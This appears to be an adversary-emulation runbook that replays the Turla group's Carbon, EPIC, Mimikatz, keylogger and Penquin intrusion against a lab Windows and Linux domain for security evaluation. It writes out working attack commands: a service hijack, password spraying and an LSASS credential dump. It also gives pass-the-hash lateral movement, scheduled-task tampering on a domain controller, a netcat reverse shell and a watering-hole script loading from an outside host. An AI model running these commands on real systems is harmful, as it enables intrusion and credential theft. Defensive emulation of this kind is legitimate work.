# Carbon Protections Scenario

Legend of symbols:
* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Sign out of something

---

## Protections Setup

:arrow_right: RDP, do not SSH, to the Kali attacker machine `(176.59.15.33)`.

* Open a new terminal window, cd to the cloned repo control server, and start the control server:

```bash
cd /opt/day1/turla/Resources/control_server
rm logs.txt
sudo ./controlServer -c ./config/turla_day1.yml
```

* Within your Kali control server terminal window, right click and select
"Split Terminal Horizontally". Be careful not to terminate the control server.

* In the new terminal window, change directory to the control server repo:

```bash
cd /opt/day1/turla/Resources/control_server
```

* Ensure that the Carbon and EPIC handlers started up.

<br>

## Test 1: Initial Access via Spearphishing Link

:microphone: `Voice Track:`

Test 1 emulates Turla gaining initial access via a spearphishing link sent in
an email to the user `Gunter`.

The link initiates the download of a fake software update executable named
NTFVersion.exe.

---

### :biohazard: Procedures

:arrow_right: RDP to `hobgoblin (10.20.20.102)` as `Gunter`:

| Username   | Password |
| :--------: | :---------------: |
| skt\Gunter  | Password1! |

* Open Microsoft Edge, declining all first-run options, and browse to `https://brieftragerin.skt.local/owa`. Login:

| Username   | Password |
| :--------: | :---------------: |
| skt\Gunter  | Password1! |

* Open the email from
`noreply@sktlocal.it` and click the link in the email to initiate the download of
`NTFVersion.exe`. ❗ DO NOT EXECUTE THE FILE.

* Open File Explorer and browse to Downloads

### :moyai: Source Code

* [EPIC Dropper](../../Resources/EPIC/SimpleDropper)
  * [File write of EPIC injector as mxs_installer.exe](../../Resources/EPIC/SimpleDropper/SimpleDropper/Source.cpp#L34-L50)
  * [Registry modification](../../Resources/EPIC/SimpleDropper/SimpleDropper/Source.cpp#L95-L143)

### :microscope: Cited Intelligence

* <https://securelist.com/the-epic-turla-operation/65545/>
* <https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4501a782-fd84-4f44-a231-ee2a3e838c39&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments>
* <https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf>

<br>

## Test 2: EPIC and Carbon on Workstation

:microphone: `Voice Track:`

Test 2 emulates user execution of the EPIC dropper, execution of the EPIC
injector via the Winlogon `shell` registry key value, and execution of the
Carbon installer.

---

### :biohazard: Procedures

:arrow_right: Open up a new terminal tab in your Kali machine using
Ctrl+Shift+T, name this tab "smbclient" and copy the EPIC injector to the
Windows host `hobgoblin`:

```bash
cd /opt/day1/turla/Resources/EPIC/SimpleDropper/SimpleDropper/bin/
smbclient -U 'skt.local\Frieda'%'Password3!' //10.20.20.102/C$ -c 'put SimpleDropper_http.exe Users\Gunter\Downloads\NTFVersion.exe'
```

:arrow_right: Return to your RDP to `hobgoblin`. Open File Explorer and browse
to Gunter's Downloads folder.

* Double click and run NTFVersion.exe

:o: Wait 1 minute then close out of all tabs and sign out of the RDP session to `hobgoblin` as `Gunter`.

:arrow_right: Re-RDP to `hobgoblin (10.20.20.102)` as `Gunter`:

| Username   | Password |
| :--------: | :---------------: |
| skt\Gunter  | Password1! |

* Open Microsoft Edge and browse to `https://brieftragerin.skt.local/owa`.

:arrow_right: **Set a timer for 2 minutes** then switch to your Kali control server terminal and
confirm that a new implant has registered and the automated discovery output has been returned in
the server log.

**NOTE:** The injector will wait **2 minutes**, before injecting EPIC's Guard DLL into explorer.exe and,
subsequently, EPIC's worker DLL into Microsoft Edge.

* Within your Kali control server terminal window, right click and select "Split Terminal Horizontally". Be careful not to terminate the control server.

* In your lower terminal tab, copy and paste the first set of discovery commands:
```bash
cd /opt/day1/turla/Resources/control_server
./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | net group "Domain Admins" /domain && net group "Domain Computers" /domain && net group "Domain Controllers" /domain && tasklist /svc'
```

* :heavy_exclamation_mark: Verify that the `ViperVPNSvc` service shows up in the tasklist output towards the end.

```bash
grep 'ViperVPNSvc' logs.txt -i
```

* This should return:
    * >```
      >viperVpn.exe                  <PID> ViperVPNSvc
      >```

* Wait for the command to return before tasking the next command to query the service and who can access it:
```bash
./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | reg query HKLM\SYSTEM\CurrentControlSet\Services\ViperVPNSvc && powershell "$(Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ViperVPNSvc).Access"'
```

* Wait for the command to return before tasking EPIC to modify the misconfigured ViperVPNSvc service to use our implant to execute:

```bash
./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | reg add "HKLM\system\currentcontrolset\services\ViperVPNSvc" /t REG_EXPAND_SZ /v ImagePath /d "cmd.exe /c %TEMP%\mxs_installer.exe" /f'
```

* Wait for the command to return.

:arrow_right: Minimize (do not close) the `hobgoblin` RDP window.

:arrow_right: RDP into `bannik (10.20.10.9)`, as `Frieda`:

| Username   | Password |
| :--------: | :---------------: |
| skt\Frieda  | Password3! |

* Close any spurious windows.

* Open up an administrative Powershell session and run the following commands to remotely restart the service:

```powershell
sc.exe \\hobgoblin stop ViperVPNSvc
sc.exe \\hobgoblin start ViperVPNSvc
```
ℹ️ Starting the ViperVPN service should take at least 30 seconds and eventually
result in an error `[SC] StartService FAILED 1053`. The EPIC injector will wait
an additional 2 minutes before performing injection. If the `[SC] StartService
FAILED 1053` error occurs in less than 10 seconds and/or you don't receive a
new session, contact your Evals lead.

* Wait for the command to return and then :o: sign out of your RDP session to `bannik` as `Frieda`

:arrow_right: Switch to your Kali attack station and confirm that a new elevated implant has registered.

:arrow_right: Switch back to your Kali terminal and task the SYSTEM level EPIC implant to download the CARBON-DLL installer:
```bash
./evalsC2client.py --set-task 51515228-8a7b-4226-e6e3f4 'name | C:\Windows\System32\WinResSvc.exe | dropper.exe'
```

* Wait for the command to return and then task the EPIC implant to execute the CARBON-DLL installer:
```bash
./evalsC2client.py --set-task 51515228-8a7b-4226-e6e3f4 'exe | C:\Windows\System32\WinResSvc.exe'
```

* CARBON-DLL should inject into the Microsoft Edge process and beacon back to the C2 server. Check that there is a new Carbon implant session registered with the C2 server

* Wait for the command to return and then task the Carbon implant to execute some discovery commands:
```bash
./evalsC2client.py --set-task 9b5ef515 '{"id": 0, "cmd": "whoami"}'
```

---

### :moyai: Source Code

* [EPIC Dropper](../../Resources/EPIC/SimpleDropper)
  * [File write of EPIC injector as mxs_installer.exe](../../Resources/EPIC/SimpleDropper/SimpleDropper/Source.cpp#L34-L50)
  * [Registry modification](../../Resources/EPIC/SimpleDropper/SimpleDropper/Source.cpp#L95-L143)
* [EPIC injector](../../Resources/EPIC/Defense-Evasion/reflective_injector/reflective_injector/)
  * Extract EPIC Guard DLL from resources section [FindResourceW](../../Resources/EPIC/Defense-Evasion/reflective_injector/reflective_injector/Source.cpp#L162-L194)
  * Targeting explorer.exe for [DLL injection](../../Resources/EPIC/Defense-Evasion/reflective_injector/reflective_injector/Source.cpp#L200-L234)
* [EPIC Guard](../../Resources/EPIC/Defense-Evasion/reflective-guard/reflective-guard/)
  * Extract EPIC payload DLL from resources section [FindResourceW](../../Resources/EPIC/Defense-Evasion/reflective-guard/reflective-guard/dllmain.cpp#L158-L190)
  * Targeting browser processes for [DLL injection](../../Resources/EPIC/Defense-Evasion/reflective-guard/reflective-guard/dllmain.cpp#L232-L280)
* [EPIC Payload](../../Resources/EPIC/payload/)
  * Execute commands [ExecCmd](../../Resources/EPIC/payload/src/epic.cpp#L47-L71)
  * User discovery [GetAllUsers](../../Resources/EPIC/payload/src/epic.cpp#L111-L182)
  * Directory discovery [DirectoryDiscovery](../../Resources/EPIC/payload/src/epic.cpp#L257-L298)
  * Write results to log file [WriteResults](../../Resources/EPIC/payload/src/epic.cpp#L311-L345)
  * File download [DownloadFile](../../Resources/EPIC/payload/src/epic.cpp#L441-L466)
  * C2 communications are:
    * [bzip2 compressed](../../Resources/EPIC/payload/src/comms.cpp#L462-L469)
    * [AES encrypted](../../Resources/EPIC/payload/src/comms.cpp#L483-L484)
    * [RSA encrypted AES key](../../Resources/EPIC/payload/src/comms.cpp#L487-L497)
    * [base64 encoded](../../Resources/EPIC/payload/src/comms.cpp#L505)
* [CARBON-DLL installer](../../Resources/Carbon/CarbonInstaller/README.md)
  * [Drop components](../../Resources/Carbon/CarbonInstaller/Dropper/src/file_handler.cpp#L178)
  * [Create Loader Service](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L170)
    * Service registry edits: [1](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L230), [2](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L284)
  * [Start Loader Service](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L354)
  * [Loader Service](../../Resources/Carbon/CarbonInstaller/Loader/src/service.cpp)
* [CARBON-DLL Orchestrator](../../Resources/Carbon/Orchestrator/README.md)
  * [Comms Lib DLL Injection](../../Resources/Carbon/Orchestrator/src/injection.cpp#L454)
  * [Task Execution](../../Resources/Carbon/Orchestrator/src/tasking.cpp#L388)
* [CARBON-DLL Comms Lib](../../Resources/Carbon/CommLib/README.md)
  * [Beacon and task retrieval over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L313)
  * [Upload task output over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L342)

### :microscope: Cited Intelligence

* <https://securelist.com/the-epic-turla-operation/65545/>
* <https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4501a782-fd84-4f44-a231-ee2a3e838c39&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments>
* <https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf>
* <https://securelist.com/analysis/publications/65545/the-epic-turla-operation/>
* <https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf>
* <https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf>
* <https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf>
* <https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf>
* <https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/>
* <https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html>
* <https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra>

<br>

## Test 3: Password Spray

:microphone: `Voice Track:`

Test 3 emulates Turla laterally moving to the domain controller by conducting
password spraying via a batch script to retrieve a domain admin's credentials
to the domain controller. The batch script sprays several of the discovered
domain admin accounts with weak passwords, one of which successfully mounts the
`C:\` drive of the domain controller.

---

### :biohazard: Procedures

:arrow_right: From the "smbclient" tab on the Kali Linux machine, copy the
password spray script to `hobgoblin`:
```bash
cd /opt/day1/turla/Resources/payloads/carbon/
smbclient -U 'skt.local\frieda'%'Password3!' //10.20.20.102/C$ -c 'put password_spray.bat Users\Public\winsas64.bat'
```

:arrow_right: Return to your RDP session to `hobgoblin` as `Gunter`.

:arrow_right: Open a **Windows Command Prompt** and execute the password spray script.

```bat
"C:\Users\Public\winsas64.bat"
```

:heavy_exclamation_mark: Verify that the script successfully sprays `Frieda`'s
password by checking that output matches the following:
```text
The command completed successfully.

frieda:Password3! SUCCESS
```

### :moyai: Source Code

* [Password spray batch script](../../Resources/payloads/carbon/password_spray.bat)

### :microscope: Cited Intelligence

* <https://securelist.com/the-epic-turla-operation/65545/>

<br>

## Test 4: Carbon on Domain Controller

:microphone: `Voice Track:`

Test 4 emulates execution of CARBON-DLL on the domain controller via scheduled
task.

---

### :biohazard: Procedures

:arrow_right: From the "smbclient" tab on the Kali Linux machine, copy the
Carbon installer executable to Windows host, `hobgoblin`.
```bash
cd /opt/day1/turla/Resources/payloads/carbon/
smbclient -U 'skt.local\frieda'%'Password3!' //10.20.20.102/C$ -c 'put carbon_installer_2.exe Windows\System32\wmimetricsq.exe'
```

:arrow_right: Return to your RDP session to `hobgoblin (10.20.20.102)`
as `Gunter`.

* Open File Explorer and browse to `C:\Windows\System32`. Order the files by date.

* Open an Admin Command Prompt. Use the following credentials if prompted:

| Username   | Password |
| :--------: | :---------------: |
| skt\frieda | Password3! |

:arrow_right: Minimize the RDP session to `hobgoblin` and start a new RDP
session to `bannik (10.20.10.9)` as `Frieda`:

| Username   | Password |
| :--------: | :---------------: |
| skt\Frieda  | Password3! |

* Open Microsoft Edge.

:arrow_right: Return to your RDP session to `hobgoblin (10.20.20.102)` and
from the Admin Command Prompt, copy the 2nd Carbon installer to `bannik (10.20.10.9)`:

```bat
move C:\Windows\System32\wmimetricsq.exe \\bannik\C$\Windows\System32
```

:arrow_right: In your RDP session to `bannik (10.20.10.9)`, open File Explorer
and browse to `C:\Windows\System32`. Order the files by date.

:arrow_right: Return to your RDP session to `hobgoblin (10.20.20.102)`.

* From the Admin Command Prompt, execute the following to enumerate schtasks on
the domain controller:

```bat
schtasks /query /S bannik /U skt\Frieda /P Password3!
```

* :heavy_exclamation_mark: Verify that `\Microsoft\Windows\Customer Experience
Improvement Program\Consolidator` task appears in the output.
  * In the Command Prompt, press CTRL+F and in the "Find what:" field, enter
  `Customer Experience Improvement Program`
  * The output should contain:
  * >    ```
    >    Folder: \Microsoft\Windows\Customer Experience Improvement Program
    >    TaskName                                 Next Run Time          Status         
    >    ======================================== ====================== ===============
    >    Consolidator                             2/24/2023 12:00:00 AM  Ready          
    >    UsbCeip                                  N/A                    Ready      
    >    ```

* Wait for the command to return and then modify a scheduled task using the
discovered password for the domain admin `Frieda` (<https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a>).

```bat
schtasks /Change /S bannik /U skt\Frieda /P Password3! /TN "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /TR %SystemRoot%\System32\wmimetricsq.exe
```

* Wait for the command to return and then start the modified scheduled task on
the domain controller.

```bat
schtasks /Run /S bannik /U skt\Frieda /P Password3! /TN "\Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /I
```

:arrow_right: Return to your RDP session to bannik.
 
* Open File Explorer and browse to `C:\Program Files\Windows NT\2028`. Validate
the existence of a `dsntport.dat` file. The log file should be growing every
~20 seconds.

### :moyai: Source Code

* [CARBON-DLL installer](../../Resources/Carbon/CarbonInstaller/README.md)
  * [Drop components](../../Resources/Carbon/CarbonInstaller/Dropper/src/file_handler.cpp#L178)
  * [Create Loader Service](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L170)
    * Service registry edits: [1](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L230), [2](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L284)
  * [Start Loader Service](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L354)
  * [Loader Service](../../Resources/Carbon/CarbonInstaller/Loader/src/service.cpp)
* [CARBON-DLL Orchestrator](../../Resources/Carbon/Orchestrator/README.md)
  * [Comms Lib DLL Injection](../../Resources/Carbon/Orchestrator/src/injection.cpp#L454)
  * [Task Execution](../../Resources/Carbon/Orchestrator/src/tasking.cpp#L388)
* [CARBON-DLL Comms Lib](../../Resources/Carbon/CommLib/README.md)
  * [Beacon and task/payload retrieval over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L313)
  * [Upload task output over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L342)
  * [Peer to peer communications over named pipes](../../Resources/Carbon/CommLib/src/NamedPipeP2p.cpp)

### :microscope: Cited Intelligence

* <https://securelist.com/the-epic-turla-operation/65545/>
* <https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a>
* <https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/>
* <https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html>
* <https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra>

<br>

## Test 5: Mimikatz and PsExec of 3rd Carbon Installer

:microphone: `Voice Track:`

Test 5 emulates Turla downloading and executing Mimikatz as `terabox.exe` in
order to perform lateral movement to a second workstation in the domain.

---

### :biohazard: Procedures

:arrow_right: From the "smbclient" tab on the Kali Linux machine, copy over
Mimikatz to `bannik (10.20.10.9)`:
```bash
cd /opt/day1/turla/Resources/payloads/carbon
smbclient -U 'skt.local\frieda'%'Password3!' //10.20.10.9/C$ -c 'put mimikatz.exe Windows\System32\terabox.exe'
```

:arrow_right: Return to your RDP session to `bannik (10.20.10.9)` as `Frieda`.

* Open File Explorer and browse to `C:\Windows\System32`. Order the files by
date.

* Open an elevated Windows Command Prompt and execute the following
command to dump LSASS:

NOTE: This command varies slightly from the Detections scenario with the
addition of `privilege::debug` since we are not executing from SYSTEM
context.

```bat
C:\Windows\System32\terabox.exe "pr::d" "lsdu::go /ynot" "quit"
```

* :heavy_exclamation_mark: Verify that the NTLM hash for `adalwolfa` is included
in the output.
  * In the Command Prompt, press CTRL+F and in the "Find what:" field, enter
  `NTLM : 07d128430a6338f8d537f6b3ae1dc136`
  * The output should contain:
  * >    ```
    >    RID  : 00000456 (1110)
    >    User : Adalwolfa
    >
    >    * Primary
    >        NTLM : 07d128430a6338f8d537f6b3ae1dc136
    >        LM   : 
    >    Hash NTLM: 07d128430a6338f8d537f6b3ae1dc136
    >        ntlm- 0: 07d128430a6338f8d537f6b3ae1dc136
    >        lm  - 0: 95b8536c32208871930216e62d5e12d4
    >    ```

:arrow_right: From the "smbclient" tab on the Kali Linux machine, copy over
PsExec and the 3rd Carbon installer to `bannik (10.20.10.9)`:

```bash
smbclient -U 'skt.local\frieda'%'Password3!' //10.20.10.9/C$ -c 'put PsExec.exe Windows\System32\wsqsp.exe'
smbclient -U 'skt.local\frieda'%'Password3!' //10.20.10.9/C$ -c 'put carbon_installer_3.exe Windows\System32\wsqmanager.exe'
```

:arrow_right: Return to your RDP session to `bannik (10.20.10.9)` as `Frieda`.

* Return to the File Explorer window in System32.

* :arrow_right: Minimize (do not close) the RDP window. Start a new RDP session
to `khabibulin (10.20.20.104)` as `adalwolfa`:

| Username   | Password |
| :--------: | :---------------: |
| skt\adalwolfa  | Password2! |

* Close any spurious windows

* Open up Edge, but don't browse to any website just yet. The browser process
is needed for Carbon comms lib DLL injection to occur.

:arrow_right: Minimize (do not close) the `khabibulin (10.20.20.104)` RDP
window and return to the RDP session to `bannik (10.20.10.9)`.

* From the existing elevated Windows Command Prompt, execute Mimikatz
Pass-the-Hash with PsExec to execute the 3rd Carbon installer on `khabibulin
(10.20.20.104)`:

```bat
C:\Windows\System32\terabox.exe "pr::d" "slsa::htp /user:adalwolfa /domain:skt /ntlm:07d128430a6338f8d537f6b3ae1dc136 /remotepc:khabibulin /pexe:C:\Windows\System32\wsqsp.exe /sys:1 /prun:C:\Windows\System32\wsqmanager.exe" "quit"
```

:heavy_exclamation_mark: Verify that a new Carbon implant has been registered with the control server.

### :moyai: Source Code

* [Mimikatz](../../Resources/Mimikatz)
* [CARBON-DLL installer](../../Resources/Carbon/CarbonInstaller/README.md)
  * [Drop components](../../Resources/Carbon/CarbonInstaller/Dropper/src/file_handler.cpp#L178)
  * [Create Loader Service](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L170)
    * Service registry edits: [1](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L230), [2](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L284)
  * [Start Loader Service](../../Resources/Carbon/CarbonInstaller/Dropper/src/service_handler.cpp#L354)
  * [Loader Service](../../Resources/Carbon/CarbonInstaller/Loader/src/service.cpp)
* [CARBON-DLL Orchestrator](../../Resources/Carbon/Orchestrator/README.md)
  * [Task Execution](../../Resources/Carbon/Orchestrator/src/tasking.cpp#L388)
* [CARBON-DLL Comms Lib](../../Resources/Carbon/CommLib/README.md)
  * [Beacon and task/payload retrieval over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L313)
  * [Upload task output over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L342)

### :microscope: Cited Intelligence

* [Report 4: SwissCERT - RUAG Report](https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html)
* [Report 9: Symantec - Waterbug New Toolset](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments)
* <https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/>
* <https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html>
* <https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra>
* <https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html>
* <https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments>
* <https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/>
* <https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/>

<br>

## Test 6: Keylogger

:microphone: `Voice Track:`

Test 6 emulates Turla installing a custom keylogger (`wingtsvcupdt.exe`) on
`Adalwolfa`'s workstation and harvesting credentials from the system.

---

### :biohazard: Procedures

:arrow_right: Start a new RDP session to `khabibulin (10.20.20.104)` as
`adalwolfa` (if no existing RDP from a previous test):

| Username   | Password |
| :--------: | :---------------: |
| skt\adalwolfa  | Password2! |

:arrow_right: From the "smbclient" tab on the Kali Linux machine, copy over
the keylogger to `khabibulin (10.20.20.104)`:

```bash
smbclient -U 'skt.local\adalwolfa'%'Password2!' //10.20.20.104/C$ -c 'put keylogger.exe Windows\Temp\wingtsvcupdt.exe'
```

:arrow_right: Return to your RDP session to `khabibulin (10.20.20.104)` as `adalwolfa`.

* Open an elevated Windows Command Prompt and execute the following command to
start the keylogger:

```bat
C:\Windows\Temp\wingtsvcupdt.exe
```

* NOTE: This should hang the terminal with the following output:
    * >```
      >Monitoring window information...
      >Set hooks
      >```

* Simulate activity as Adalwolfa:
  * Minimize the elevated Windows Command Prompt
  * Open Edge.
    * :heavy_exclamation_mark: **Type in full, do not copy or autocomplete,** 
    <http://kagarov/index.html> into the address bar and press enter.
  * Open a new non-admin PowerShell terminal
    * **Type do not copy** the SSH command: `ssh adalwolfa@10.20.10.23`
    * **Type do not copy** the SSH password `Password2!` when prompted.
    * Within the SSH session, **type do not copy** the follow commands as
    `Adalwolfa`:
        1. `sudo nano /var/www/html/index.html`
        2. Go to line 198 with `CTRL + SHIFT + -` then type 198
        3. Replace `Apache2 Ubuntu Default Page` with `Adalwolfa's Page`
        4. save the file with `CTRL + X`, `Y`, `enter`
        5. Type `exit` to exit from the SSH session

* From the elevated Windows Command Prompt, CTRL + C to kill the keylogger

* Execute the following command to output the data written to the keylogger file:
```bat
type %temp%\\~DFA512.tmp
```

:heavy_exclamation_mark: Verify that the keystrokes were logged containing the
website information and Adalwolfa's SSH credentials.

### :moyai: Source Code

* [Keylogger](../../Resources/Keylogger/README.md)
  * [Current hostname discovery](../../Resources/Keylogger/Keylogger/Keylogger/keylogger.cpp#L41)
  * [Token manipulation and session discovery to restart in active session](../../Resources/Keylogger/Keylogger/Keylogger/keylogger.cpp#L579)
  * [Keylogging hook routine](../../Resources/Keylogger/Keylogger/Keylogger/keylogger.cpp#L349)
  * [Set keylogging hook](../../Resources/Keylogger/Keylogger/Keylogger/keylogger.cpp#L719)
  * [Active window discovery](../../Resources/Keylogger/Keylogger/Keylogger/keylogger.cpp#L419)

### :microscope: Cited Intelligence

* <https://securelist.com/the-epic-turla-operation/65545/>
* <https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html>
* <https://blog.talosintelligence.com/2021/09/tinyturla.html>
* <https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/>

<br>

## Test 7: Penquin

:microphone: `Voice Track:`

Test 7 emulates Turla laterally moving to the Linux Apache server and
installing Penquin. Once Penquin's sniffer has been installed, a magic packet
is sent to the Apache server, from which the sniffer component of Penquin
parses the IP address to connect to, and triggers the establishment of a
reverse shell.

---

### :biohazard: Procedures

:arrow_right: From the "smbclient" tab on the Kali Linux machine, copy over
Penquin and pscp.exe to `khabibulin (10.20.20.104)`:

```bash
smbclient -U 'skt.local\adalwolfa'%'Password2!' //10.20.20.104/C$ -c 'put hsperfdata.zip Windows\Temp\tmp504e.tmp'
smbclient -U 'skt.local\adalwolfa'%'Password2!' //10.20.20.104/C$ -c 'put pscp.exe Windows\System32\pscp.exe'
```

:arrow_right: Switch to your RDP session to `khabibulin (10.20.20.104)`
or, if one was not opened from a previous step, open a new RDP session to
`khabibulin (10.20.20.104)` as `adalwolfa`:

| Username   | Password |
| :--------: | :---------------: |
| skt\adalwolfa  | Password2! |

* Open File Explorer and browse to `C:\Windows\System32`

* Open an elevated Windows Command Prompt (if no existing admin prompt from a
previous step)

* Use the elevated Windows Command Prompt to copy Penquin to the Apache web
server using Adalwolfa's credentials.

```bash
echo y | C:\Windows\System32\pscp.exe -pw Password2! C:\Windows\Temp\tmp504e.tmp adalwolfa@10.20.10.23:/tmp/tmp514f524f
```

:arrow_right: From the "smbclient" tab on the Kali Linux machine, copy over
plink.exe to `khabibulin (10.20.20.104)`:

```bash
smbclient -U 'skt.local\adalwolfa'%'Password2!' //10.20.20.104/C$ -c 'put plink.exe Windows\System32\plink.exe'
```

:arrow_right: Return to your RDP session to `khabibulin (10.20.20.104)` as
`adalwolfa`.

* Return to the File Explorer window in System32.

* Return to the elevated Windows Command Prompt to execute Penquin (Penquin
takes ~8 seconds to execute).

```bash
(echo unzip /tmp/tmp514f524f -d /tmp & echo sudo mv /tmp/hsperfdata /root/hsperfdata & echo sudo /root/hsperfdata & echo exit) | C:\Windows\System32\plink.exe -ssh -l adalwolfa -pw Password2! 10.20.10.23
```

* Wait for the command to return.

* :arrow_right: From your Kali Linux machine, open a new terminal tab using Ctrl+Shift+T. Rename the new tab to `Penquin NC`

* In the new tab, set up a Netcat listener for Penquin's reverse shell to connect to:

```bash
nc -lvvp 8081
```

* Open up another terminal tab and name this one to `Packet Sender`. Run the following commands to send the magic packet to the Apache server using
the `sendPacket.py` utility.

```bash
cd /opt/day1/turla
sudo -E python3 Resources/Penquin/sendPacket.py --handler_ip 176.59.15.33 --handler_port 8081 --target_ip 10.20.10.23 --target_port 8080 --payload_type base64
```

* Wait a few seconds and then check the Netcat tab (`Penquin NC`). The Netcat prompt should report a successful connection.

* In the terminal where the reverse shell has connected to the Netcat listener, paste the following command to add the
 watering hole redirection to index.html:

```bash
echo "<script>if (document.getElementById('xyz')) {{}} else {{ var gam = document.createElement('script'); gam.type = 'text/javascript'; gam.async = true; gam.src = ('http://anto-int.com/counter.js'); var sm = document.getElementsByTagName('script')[0]; sm.parentNode.insertBefore(gam, sm); var fl = document.createElement('span'); fl.id = 'xyz'; var d =  document.getElementsByTagName('div')[0]; d.parentNode.insertBefore(fl, d);}}</script>" >> /var/www/html/index.html
```

* Wait 1 minute and then send the following command to close the reverse shell

```bash
exit
```

### :moyai: Source Code

* [Penquin](../../Resources/Penquin/) ([Network Sniffer](../../Resources/Penquin/sniff.c) & [Penquin Installer](../../Resources/Penquin/main.c))
  * [Writes the sniffer (Penquin) to disk](../../Resources/Penquin/main.c#L220)
  * [Moves Penquin to /usr/bin](../../Resources/Penquin/main.c#L121)
  * [Creates a service file](../../Resources/Penquin/main.c#L173)
  * [Stops cron service](../../Resources/Penquin/main.c#L143)
  * [Executes Penquin as cron](../../Resources/Penquin/main.c#L198)
  * [Real cron starts as child process](../../Resources/Penquin/sniff.c#L198)
  * [Installs packet sniffer on eth0](../../Resources/Penquin/sniff.c#L482)
  * [Magic packet filter criteria](../../Resources/Penquin/sniff.c#L437-L442)
  * [Execute reverse shell](../../Resources/Penquin/sniff.c#L405)
  * [sendPacket.py](../../Resources/Penquin/sendPacket.py)

### :microscope: Cited Intelligence

* <https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf>
* <https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf>
* <https://securelist.com/the-penquin-turla-2/67962/>
* <https://www.youtube.com/watch?v=JXsjRUxx47E&t=647s>
* <https://lab52.io/blog/looking-for-penquins-in-the-wild/>
* <https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/>
* <https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf>
* <https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf>
